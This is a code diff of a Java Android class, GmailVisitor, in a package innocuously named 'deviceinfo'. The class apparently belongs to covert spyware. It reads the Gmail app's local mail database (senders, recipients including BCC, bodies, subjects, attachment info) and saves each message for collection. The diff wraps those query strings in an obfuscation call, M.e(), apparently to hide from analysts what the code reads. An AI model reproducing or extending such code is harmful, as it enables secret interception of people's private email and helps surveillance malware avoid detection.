@@ -13,17 +13,18 @@ import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.module.ModuleMessage;
 import com.android.deviceinfo.module.message.Filter;
 import com.android.deviceinfo.util.Check;
+import com.android.deviceinfo.util.StringUtils;
+import com.android.m.M;
 
 public class GmailVisitor extends RecordVisitor {
 	private static final String TAG = "GmailVisitor";
 	boolean initialized = false;
 	private ModuleMessage moduleMessage;
 	private String mailstore;
-	public String[] projection = new String[] { "_id", "fromAddress", "toAddresses", "ccAddresses", "bccAddresses", // 4
-			"bodyCompressed", "dateSentMs", "subject", "snippet", "bodyEmbedsExternalResources", // 9
-			"joinedAttachmentInfos" };
+	public String[] projection = StringUtils
+			.split(M.e("_id,fromAddress,toAddresses,ccAddresses,bccAddresses,bodyCompressed,dateSentMs,subject,snippet,bodyEmbedsExternalResources,joinedAttachmentInfos"));
 
-	public String selection = "_id > ";
+	public String selection = M.e("_id > ");
 	public int lastId;
 	private String from;
 	private boolean requestStop;
@@ -32,7 +33,7 @@ public class GmailVisitor extends RecordVisitor {
 
 	public GmailVisitor(ModuleMessage moduleMessage, String mailstore, Filter filterCollect) {
 		this.moduleMessage = moduleMessage;
-		this.from = mailstore.substring("mailstore.".length(), mailstore.length() - ".db".length());
+		this.from = mailstore.substring(M.e("mailstore.").length(), mailstore.length() - M.e(".db").length());
 		this.mailstore = mailstore;
 		this.filter = filterCollect;
 	}
@@ -79,7 +80,8 @@ public class GmailVisitor extends RecordVisitor {
 		String body = snippet;
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (cursor), _id=" + id + " date= " + timestamp + " from=" + fromAddress + " to= " + toAddresses );
+			Check.log(TAG + " (cursor), _id=" + id + " date= " + timestamp + " from=" + fromAddress + " to= "
+					+ toAddresses);
 		}
 
 		try {
@@ -97,8 +99,8 @@ public class GmailVisitor extends RecordVisitor {
 		moduleMessage.saveEmail(m);
 		moduleMessage.updateMarkupMail(mailstore, id, false);
 
-		if(Cfg.ONE_MAIL){
-			stopRequest=true;
+		if (Cfg.ONE_MAIL) {
+			stopRequest = true;
 		}
 		return id;
 	}
@@ -118,8 +120,8 @@ public class GmailVisitor extends RecordVisitor {
 	@Override
 	public String getSelection() {
 		String where = selection + lastId;
-		if(filter.doFilterFromDate){
-			where += " and dateSentMs > " + filter.fromDate.getTime();
+		if (filter.doFilterFromDate) {
+			where += M.e(" and dateSentMs > ") + filter.fromDate.getTime();
 		}
 		return where;
 	}
